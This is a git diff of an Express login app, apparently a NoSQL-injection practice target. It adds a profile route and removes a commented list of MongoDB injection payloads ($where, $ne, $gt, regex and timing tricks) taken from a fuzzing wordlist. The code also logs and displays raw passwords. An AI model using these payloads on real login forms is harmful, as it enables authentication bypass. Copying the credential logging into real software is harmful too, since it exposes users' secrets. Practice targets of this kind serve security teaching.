@@ -37,33 +37,12 @@ app.get('/login', function(request, response){
     
 });
 
+app.get('/profile', function(request, response){
+
+        response.render('profile');
+});
+
 //https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt
-/*
-
-true, $where: '1 == 1'
-, $where: '1 == 1'
-$where: '1 == 1'
-', $where: '1 == 1'
-1, $where: '1 == 1'
-{ $ne: 1 }
-', $or: [ {}, { 'a':'a
-' } ], $comment:'successful MongoDB injection'
-db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
-|| 1==1
-' || 'a'=='a
-*/
-//' && this.password.match(/.*/)//+%00
-//' && this.passwordzz.match(/.*/)//+%00
-//'%20%26%26%20this.password.match(/.*/)//+%00
-//'%20%26%26%20this.passwordzz.match(/.*/)//+%00
-//{$gt: ''}
-//{"$gt": ""}
-//[$ne]=1
-//';sleep(5000);
-//';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
-//{$nin: [""]}}
-
 
 app.post('/login', async function(request, response){ 
 
@@ -80,11 +59,6 @@ app.post('/login', async function(request, response){
     }
 
     console.log("Username raw: " + username);
-
-    // If you don't do a JSON parse, then { "$gt": "" } doesn't work
-//    username = JSON.parse(username);
-
-    //password = JSON.parse(password);
     console.log("Password raw: " + password);
 
     let query = {
@@ -102,7 +76,7 @@ app.post('/login', async function(request, response){
 
         console.log("Printing results:");
         console.log(results);
-        response.render('login', {
+        response.render('profile', {
             results: results,
             username: username,
             password: password
